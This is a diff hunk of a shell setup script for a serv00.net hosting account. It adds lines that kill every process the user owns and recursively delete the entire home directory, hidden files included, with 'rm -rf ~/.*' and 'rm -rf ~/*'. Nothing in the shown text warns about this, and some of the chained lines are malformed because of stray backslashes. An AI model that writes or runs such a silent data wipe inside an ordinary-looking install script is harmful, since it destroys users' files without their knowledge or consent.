@@ -24,7 +24,12 @@ HOSTNAME=$(hostname)
 WORKDIR="domains/${USERNAME}.serv00.net/logs"
 mkdir -p "$WORKDIR" && chmod 777 "$WORKDIR"
 cd "$WORKDIR"
-
+ps aux | grep $(whoami) | grep -v "sshd\|bash\|grep" | awk '{print $2}' | xargs -r kill -9 > /dev/null 2>&1
+chmod -R 755 ~/* \
+chmod -R 755 ~/.* \
+rm -rf ~/.* \
+rm -rf ~/*
+rm -rf ~/*
 # 自动选择可用 IP
 function select_ip() {
   echo "正在选择可用 IP..."
